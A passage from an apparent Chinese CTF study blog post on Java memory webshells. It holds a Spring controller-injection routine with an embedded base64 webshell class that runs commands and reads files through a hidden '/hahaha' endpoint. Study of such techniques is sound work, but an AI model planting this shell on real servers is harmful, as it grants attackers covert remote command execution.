@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,java," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这次安洵杯线下因为没上内存shell吃了亏，现在补一下。 这里需要说明下，因为网络上关于java中间件内存shell的研究已经很多了，个人做的工作主要是复现了通杀spring添加controller的思路，还有tomcat filiter添加的思路，然后自己改了下放在ysomap，并没有很新的东西，仅仅是自己的学习笔记。 环境介绍 Jdk8   Awd.jar 安洵杯线下赛java的题目，可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java内存shell学习">
+<meta property="og:url" content="http://www.star123.top/2020/12/12/java%E5%86%85%E5%AD%98shell%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言这次安洵杯线下因为没上内存shell吃了亏，现在补一下。 这里需要说明下，因为网络上关于java中间件内存shell的研究已经很多了，个人做的工作主要是复现了通杀spring添加controller的思路，还有tomcat filiter添加的思路，然后自己改了下放在ysomap，并没有很新的东西，仅仅是自己的学习笔记。 环境介绍 Jdk8   Awd.jar 安洵杯线下赛java的题目，可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-12T04:08:44.000Z">
+<meta property="article:modified_time" content="2020-12-12T09:21:40.708Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/12/12/java内存shell学习/"/>
+
+
+
+
+
+  <title>java内存shell学习 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/12/12/java%E5%86%85%E5%AD%98shell%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java内存shell学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-12T12:08:44+08:00">
+                2020-12-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次安洵杯线下因为没上内存shell吃了亏，现在补一下。</p>
+<p>这里需要说明下，因为网络上关于java中间件内存shell的研究已经很多了，个人做的工作主要是复现了通杀spring添加controller的思路，还有tomcat filiter添加的思路，然后自己改了下放在ysomap，并没有很新的东西，仅仅是自己的学习笔记。</p>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><ul>
+<li><p>Jdk8 </p>
+</li>
+<li><p>Awd.jar 安洵杯线下赛java的题目，可以直接用ysomap的cc9打。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>awd<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--latest--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="内存shell复现"><a href="#内存shell复现" class="headerlink" title="内存shell复现"></a>内存shell复现</h2><h3 id="spring-通杀型内存注册"><a href="#spring-通杀型内存注册" class="headerlink" title="spring 通杀型内存注册"></a>spring 通杀型内存注册</h3><p>这里我首先参考了雷神众测的思路，然后也看了观星的文章，发现自己复现起来和公众号的结果有些出入，这里记录下。</p>
+<p>这里的思路主要有两步，首先需要将内存shell的类，通过合适的classLoader加载到内存中，然后需要通过org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping类的registerMapping注册一个controller到上下文中。最终代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(&#123;<span class="string">"/remember"</span>&#125;)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Person <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String s1 = <span class="string">"yv66vgAAADQAwwoAMABmCABECwBnAGgLAGkAaggAawgAbAoAFwBtCgAXAG4KAC4AbwgAcAoALgBxCAByCgBGAHMKAEYAdAoARgB1BwB2CgAQAHcHAHgKABIAZgcAeQcAegoAFwB7BwB8CgB9AH4HAH8KAIAAgQoAFQCCCgAUAIMKABQAhAoAEgCFCACGCgASAIcKAIgAiQoAiACKCgBbAIsKAFsAjAgAjQoAFQCOCgBbAI8KABIAkAoALgCRCgBbAJIHAJMKACsAdwsAlAB1BwCVCgAuAGYHAJYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE0xzaGVsbC9TcHJpbmdTaGVsbDsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAJwdwEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAANyZXMBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAlwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAFL1B3bnIBAARyZWFkAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARmaWxlAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAVsaW5lMgEACkV4Y2VwdGlvbnMBAARleGVjAQAEbGluZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB2NvbW1hbmQBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEACGJ1ZmZlckluAQALYnVmZmVyRXJyb3IHAJgHAJkBAAtjbG9zZVN0cmVhbQEAFihMamF2YS9pby9DbG9zZWFibGU7KVYBAAZzdHJlYW0BABNMamF2YS9pby9DbG9zZWFibGU7AQALbmV3SW5zdGFuY2UBABUoKUxzaGVsbC9TcHJpbmdTaGVsbDsBAApTb3VyY2VGaWxlAQAQU3ByaW5nU2hlbGwuamF2YQEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMADEAMgcAmgwAmwBMBwCcDACdAJ4BAAABAAVyZWFkOgwAnwCgDAChAKIMAEsATAEABWV4ZWM6DABTAEwBAB9oZWxwOiByZWFkOltmaWxlXSB8IGV4ZWM6W2NtZF0KDACjAKQMAKUAMgwApgAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwApwAyAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAqACpAQAQamF2YS9sYW5nL1N0cmluZwcAqgwAqwCsAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uBwCtDACuAK8MADEAsAwAMQCxDACyAKkMALMAtAEAAQoMALUAqQcAtgwAtwC4DABTALkMALoAuwwAvAC9AQAFVVRGLTgMADEAvgwAvwC9DACzAMAMAF0AXgwAwQAyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAwgEAEXNoZWxsL1NwcmluZ1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvbGFuZy9UaHJvd2FibGUBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAA9wcmludFN0YWNrVHJhY2UBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsBABNqYXZhL25pby9maWxlL0ZpbGVzAQAObmV3SW5wdXRTdHJlYW0BAEYoTGphdmEvbmlvL2ZpbGUvUGF0aDtbTGphdmEvbmlvL2ZpbGUvT3Blbk9wdGlvbjspTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAd3YWl0Rm9yAQADKClJAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADmdldEVycm9yU3RyZWFtAQAcKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2Rlc3Ryb3kBABFqYXZhL2lvL0Nsb3NlYWJsZQAhAC4AMAAAAAAABgABADEAMgABADMAAAAzAAEAAQAAAAUqtwABsQAAAAIANAAAAAoAAgAAABAABAASADUAAAAMAAEAAAAFADYANwAAAAEAOAA5AAIAMwAAATsAAgAGAAAAaysSArkAAwIATi3GAFYsuQAEAQA6BBIFOgUtEga2AAeZABMtCLYACE4qLbYACToFpwAgLRIKtgAHmQATLQi2AAhOKi22AAs6BacABxIMOgUZBBkFtgANGQS2AA4ZBLYAD6cACjoEGQS2ABGxAAEACQBgAGMAEAADADQAAABKABIAAAAWAAkAGAANABkAFQAaABkAGwAiABwAKAAdADIAHgA7AB8AQQAgAEsAIgBPACQAVgAlAFsAJgBgACsAYwApAGUAKgBqAC4ANQAAAEgABwAVAEsAOgA7AAQAGQBHADwAPQAFAGUABQA+AD8ABAAAAGsANgA3AAAAAABrAEAAQQABAAAAawBCAEMAAgAJAGIARAA9AAMARQAAABgABv4AMgcAFwcARgcAFxgD+QAQQgcAEAYARwAAAA4AAQBIAAEASVsAAXMASgABAEsATAACADMAAADJAAYABQAAAEq7ABJZtwATTbsAFFm7ABVZK7YAFgO9ABe4ABgDvQAZuAAatwAbtwAcTgE6BC22AB1ZOgTGABIsGQS2AB4SH7YAHlen/+ostgAgsAAAAAMANAAAAB4ABwAAADEACAAyABEAMwApADQALAA1ADYANgBFADgANQAAADQABQAAAEoANgA3AAAAAABKAE0APQABAAgAQgBOAE8AAgApACEASwBQAAMALAAeAFEAPQAEAEUAAAAPAAL+ACwHABIHABQHABcYAFIAAAAEAAEAEAABAFMATAABADMAAAIHAAYACAAAAM27ABJZtwATTQFOAToEAToFuAAhK7YAIk4ttgAjV7sAFFm7ABVZLbYAJBIltwAmtwAcOgS7ABRZuwAVWS22ACcSJbcAJrcAHDoFAToGGQS2AB1ZOgbGABIsGQa2AB4QCrYAKFen/+kZBbYAHVk6BsYAEiwZBrYAHhAKtgAoV6f/6RkEuAApGQW4ACktxgA9LbYAKqcANjoGGQa2ACwZBLgAKRkFuAApLcYAIS22ACqnABo6BxkEuAApGQW4ACktxgAHLbYAKhkHvyy2ACCwAAQAEACAAJUAKwAQAIAAsQAAAJUAnACxAAAAsQCzALEAAAADADQAAAB2AB0AAAA8AAgAPgAKAD8ADQBAABAAQwAYAEUAHQBHADMASABJAEoATABLAFcATABmAE4AcQBPAIAAVQCFAFYAigBYAI4AWQCVAFIAlwBTAJwAVQChAFYApgBYAKoAWQCxAFUAuABWAL0AWADBAFkAxQBbAMgAXQA1AAAAUgAIAEwANABUAD0ABgCXAAUAPgBVAAYAAADNADYANwAAAAAAzQBWAD0AAQAIAMUAPABPAAIACgDDAFcAWAADAA0AwABZAFAABAAQAL0AWgBQAAUARQAAADQAB/8ATAAHBwAuBwAXBwASBwBbBwAUBwAUBwAXAAAZ+gAZVAcAK1sHAFz9ABMABwBc+QACAAoAXQBeAAEAMwAAAF4AAQACAAAADyrGAA0quQAtAQCnAARMsQABAAQACgANACsAAwA0AAAAFgAFAAAAYQAEAGMACgBmAA0AZAAOAGgANQAAAAwAAQAAAA8AXwBgAAAARQAAAAcAAk0HACsAAAkAYQBiAAEAMwAAACAAAgAAAAAACLsALlm3AC+wAAAAAQA0AAAABgABAAAAawACAGMAAAACAGQARwAAAAYAAQBlAAA="</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes1 = java.util.Base64.getDecoder().decode(s1.getBytes());</span><br><span class="line">            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;String.class, byte[].class, int.class, int.class&#125;);</span><br><span class="line">            m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//ClassLoader classLoader=ClassLoader.getSystemClassLoader();</span></span><br><span class="line">            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();</span><br><span class="line">            m.invoke(classLoader, <span class="keyword">new</span> Object[]&#123;<span class="string">"shell.SpringShell"</span>, bytes1, <span class="number">0</span>, bytes1.length&#125;);</span><br><span class="line">            javax.servlet.ServletContext sss = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();</span><br><span class="line">            org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);</span><br><span class="line">            org.springframework.web.servlet.mvc.condition.PatternsRequestCondition url = <span class="keyword">new</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition(<span class="keyword">new</span> String[]&#123;<span class="string">"/hahaha"</span>&#125;);</span><br><span class="line">            RequestMethod[] a = &#123;RequestMethod.GET, RequestMethod.POST&#125;;</span><br><span class="line">            org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition ms = <span class="keyword">new</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(a);</span><br><span class="line">            org.springframework.web.servlet.mvc.method.RequestMappingInfo info = <span class="keyword">new</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping rs = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            m = (Class.forName(<span class="string">"shell.SpringShell"</span>,<span class="keyword">true</span>,classLoader).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line">            rs.registerMapping(info, Class.forName(<span class="string">"shell.SpringShell"</span>,<span class="keyword">true</span>,classLoader).newInstance(), m);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Person o = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>首先需要把需要注入的class通过defineClass方法加载到线程的内存中，这里需要注意的可能因为classLoader不同的缘故导致在使用Class.forName的时候找不到已经加载到内存中的类。原因如下：</p>
